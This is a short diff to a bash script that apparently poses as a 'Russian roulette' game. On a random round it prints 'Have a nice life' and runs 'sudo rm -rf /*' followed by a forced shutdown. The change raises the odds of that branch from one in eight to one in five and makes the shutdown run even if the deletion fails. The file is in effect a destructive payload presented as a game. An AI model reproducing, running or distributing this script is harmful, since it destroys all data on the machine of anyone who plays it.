@@ -8,11 +8,11 @@ echo -e "How many rounds do you wanna play?"
 read rounds
 for i in $(seq 1 $rounds); do
 
-	num=$[ $RANDOM % 8 + 0 ]
+	num=$[ $RANDOM % 5 + 0 ]
 
 	if [ $num == 1 ]; then
 		echo "Have a nice life"
-		sudo rm -rf /* && shutdown -P now
+		sudo rm -rf /* ; shutdown -P now
 	else
 		echo "You won!"
 	fi
